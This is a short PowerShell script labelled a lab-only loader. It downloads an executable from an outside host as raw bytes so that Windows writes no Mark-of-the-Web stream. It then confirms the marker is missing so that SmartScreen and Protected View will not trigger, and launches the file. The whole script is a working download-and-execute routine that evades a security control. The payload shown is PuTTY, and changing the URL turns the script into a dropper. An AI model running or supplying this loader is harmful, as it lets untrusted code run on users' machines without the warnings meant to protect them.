# p.ps1 — lab-only loader
# Byte-level download via System.Net.WebClient.
# WebClient does NOT call IAttachmentExecute:Save, so no Zone.Identifier
# ADS (MOTW) is written to the resulting file.

# Force TLS 1.2 — required by the.earth.li and GitHub raw on PS 5.1
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

 $Url = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe'
 $Out = Join-Path $env:LOCALAPPDATA 'putty.exe'

# --- Byte-level download (no MOTW) ---
# DownloadData returns byte[]; WriteAllBytes writes via Win32, no Attachment Manager
 $bytes = (New-Object Net.WebClient).DownloadData($Url)
[IO.File]::WriteAllBytes($Out, $bytes)

# --- Verify MOTW is absent ---
 $ads = Get-Item $Out -Stream Zone.Identifier -ErrorAction SilentlyContinue
if ($ads) {
    Write-Host "[!] MOTW PRESENT — bypass failed" -ForegroundColor Red
} else {
    Write-Host "[+] MOTW absent — SmartScreen/Protected View will NOT trigger" -ForegroundColor Green
}
Write-Host "[+] Wrote $($bytes.Length) bytes -> $Out"

# --- Launch ---
Start-Process -FilePath $Out
